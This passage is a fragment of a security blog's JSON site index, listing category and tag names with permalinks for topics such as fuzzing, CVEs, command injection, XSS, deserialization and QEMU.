&quot;HSQLDB&quot;","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.lyle.ac.cn/categories/Web/"}],"tags":[]}],"categories":[{"name":"测绘","slug":"测绘","permalink":"https://blog.lyle.ac.cn/categories/%E6%B5%8B%E7%BB%98/"},{"name":"Network","slug":"Network","permalink":"https://blog.lyle.ac.cn/categories/Network/"},{"name":"IoT","slug":"IoT","permalink":"https://blog.lyle.ac.cn/categories/IoT/"},{"name":"Fuzz","slug":"Fuzz","permalink":"https://blog.lyle.ac.cn/categories/Fuzz/"},{"name":"Programing","slug":"Programing","permalink":"https://blog.lyle.ac.cn/categories/Programing/"},{"name":"Bin","slug":"Bin","permalink":"https://blog.lyle.ac.cn/categories/Bin/"},{"name":"Misc","slug":"Misc","permalink":"https://blog.lyle.ac.cn/categories/Misc/"},{"name":"Web","slug":"Web","permalink":"https://blog.lyle.ac.cn/categories/Web/"}],"tags":[{"name":"测绘","slug":"测绘","permalink":"https://blog.lyle.ac.cn/tags/%E6%B5%8B%E7%BB%98/"},{"name":"python","slug":"python","permalink":"https://blog.lyle.ac.cn/tags/python/"},{"name":"web","slug":"web","permalink":"https://blog.lyle.ac.cn/tags/web/"},{"name":"DNS","slug":"DNS","permalink":"https://blog.lyle.ac.cn/tags/DNS/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://blog.lyle.ac.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"AFL","slug":"AFL","permalink":"https://blog.lyle.ac.cn/tags/AFL/"},{"name":"论文阅读","slug":"论文阅读","permalink":"https://blog.lyle.ac.cn/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"},{"name":"CVE","slug":"CVE","permalink":"https://blog.lyle.ac.cn/tags/CVE/"},{"name":"Python","slug":"Python","permalink":"https://blog.lyle.ac.cn/tags/Python/"},{"name":"QEMU","slug":"QEMU","permalink":"https://blog.lyle.ac.cn/tags/QEMU/"},{"name":"工具","slug":"工具","permalink":"https://blog.lyle.ac.cn/tags/%E5%B7%A5%E5%85%B7/"},{"name":"Tricks","slug":"Tricks","permalink":"https://blog.lyle.ac.cn/tags/Tricks/"},{"name":"Command Injection","slug":"Command-Injection","permalink":"https://blog.lyle.ac.cn/tags/Command-Injection/"},{"name":"Unicode","slug":"Unicode","permalink":"https://blog.lyle.ac.cn/tags/Unicode/"},{"name":"自动化","slug":"自动化","permalink":"https://blog.lyle.ac.cn/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"XSS","slug":"XSS","permalink":"https://blog.lyle.ac.cn/tags/XSS/"},{"name":"Browser","slug":"Browser","permalink":"https://blog.lyle.ac.cn/tags/Browser/"},{"name":"反序列化","slug":"反序列化","permalink":"https://blog.lyle.ac.cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"https://blog.lyle.ac.cn/tags/PHP/"}]}